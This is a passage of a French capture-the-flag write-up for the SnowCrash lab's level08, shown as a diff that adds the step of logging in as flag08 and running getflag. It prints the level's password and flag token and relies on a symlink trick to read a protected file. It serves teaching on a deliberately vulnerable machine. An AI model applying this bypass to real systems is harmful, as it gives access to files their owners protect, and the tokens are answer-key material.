@@ -37,3 +37,11 @@ Pour créer un lien symbolique, ce qui va nous permettre de créer un raccourci 
 level08@SnowCrash:~$ ./level08 /tmp/flag08
 quif5eloekouj29ke0vouxean
 ```
+
+```
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+```
